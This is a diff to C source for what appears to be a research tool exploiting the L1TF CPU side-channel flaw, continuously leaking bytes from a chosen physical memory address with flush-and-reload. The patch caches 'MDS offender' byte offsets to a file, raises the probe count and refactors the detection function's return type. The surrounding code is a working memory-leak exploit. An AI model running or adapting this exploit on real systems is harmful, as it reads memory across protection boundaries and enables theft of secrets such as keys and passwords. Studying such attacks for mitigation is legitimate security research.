@@ -2,14 +2,17 @@
 #include "l1tf.h"
 #include "constants.h"
 #include "flush_and_reload.h"
-#include "statistics.h"
+#include <asm-generic/errno-base.h>
 #include <bits/types/siginfo_t.h>
+#include <errno.h>
 #include <getopt.h>
 #include <stdbool.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/utsname.h>
 #include <ucontext.h>
 #include <unistd.h>
 
@@ -114,6 +117,18 @@ void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer) {
   assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
 }
 
+typedef struct {
+  bool *ptr;
+  size_t mmap_size;
+  size_t amount;
+  int fd;
+} mds_offenders_t;
+
+void free_mds_offenders(mds_offenders_t mds) {
+  munmap(mds.ptr, mds.mmap_size);
+  close(mds.fd);
+}
+
 // There are some offsets in a page that always leak garbage
 // values, regardless of the page that we're actually leaking.
 // It looks like MDS but it is also different from MDS, not
@@ -125,7 +140,41 @@ void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer) {
 // It will return the amount of bytes that it detected, and
 // offsets themselves so they can be filtered out during the
 // L1tf leaking part.
-size_t detect_mds_bytes_in_page(bool **offsets) {
+mds_offenders_t detect_mds_bytes_in_page(void) {
+  // Because this operation takes quite some time, we want to
+  // cache the results to disk.
+  mds_offenders_t offenders = {0};
+  offenders.mmap_size = ((PAGE_SIZE + 1) * sizeof(bool));
+
+  offenders.fd = open("bin/.mds.cache", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
+  if (offenders.fd < 0) {
+    fprintf(
+        stderr,
+        "Failed to open the file bin/.mds.cache: %s. Continuing without the "
+        "cache\n",
+        strerror(errno));
+    offenders.ptr = mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ,
+                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  } else {
+    assert(!ftruncate(offenders.fd, offenders.mmap_size));
+    offenders.ptr = mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ,
+                         MAP_SHARED, offenders.fd, 0);
+  }
+  assert(offenders.ptr != MAP_FAILED);
+
+  // Check if we calculated the MDS bytes before on this machine
+  if (offenders.ptr[PAGE_SIZE]) {
+    for (size_t i = 0; i < PAGE_SIZE; ++i) {
+      if (offenders.ptr[i]) {
+        offenders.amount++;
+      }
+    }
+    fprintf(stderr, "Loaded MDS offenders from cache!\n");
+    return offenders;
+  }
+  fprintf(
+      stderr,
+      "There is no MDS offender cache, building one (may take some time)...\n");
 
   reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
 
@@ -134,7 +183,7 @@ size_t detect_mds_bytes_in_page(bool **offsets) {
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
 
   size_t values[PAGE_SIZE] = {0};
-  const size_t nr_of_probes = 1000;
+  const size_t nr_of_probes = 5000;
 
   // Do l1tf on the entire page, and track which bytes show
   // spurious behavior.
@@ -146,20 +195,18 @@ size_t detect_mds_bytes_in_page(bool **offsets) {
     }
   }
 
-  bool *offenders = calloc(PAGE_SIZE, sizeof(bool));
-  *offsets = offenders;
-
-  size_t nr_of_offenders = 0;
   for (size_t i = 0; i < PAGE_SIZE; ++i) {
     if (values[i]) {
-      offenders[i] = true;
-      nr_of_offenders++;
+      offenders.ptr[i] = true;
+      offenders.amount++;
     }
   }
 
+  offenders.ptr[PAGE_SIZE] = true;
+
   l1tf_leak_buffer_free(&leak);
   l1tf_reload_buffer_free(reload_buffer);
-  return nr_of_offenders;
+  return offenders;
 }
 
 // If we're printing all characters AS IS, then we might modify things like
@@ -249,9 +296,8 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   memset(results, 0, results_size);
 
   fprintf(stderr, "Detecting MDS offenders...\n");
-  bool *mds_offsets = NULL;
-  size_t offenders = detect_mds_bytes_in_page(&mds_offsets);
-  printf("-> Amount of offending bytes: %ld\n", offenders);
+  mds_offenders_t mds_offenders = detect_mds_bytes_in_page();
+  printf("-> Amount of offending bytes: %ld\n", mds_offenders.amount);
 
   printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length,
          phys_addr);
@@ -265,7 +311,7 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
       uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
 
       if (leaked_byte != 0) {
-        if (!mds_offsets[j]) {
+        if (!mds_offenders.ptr[j]) {
           new_data = true;
         }
         results[j - start] = leaked_byte;
@@ -293,6 +339,7 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
 
   l1tf_leak_buffer_free(&leak);
   l1tf_reload_buffer_free(reload_buffer);
+  free_mds_offenders(mds_offenders);
 
   ptedit_cleanup();
 }
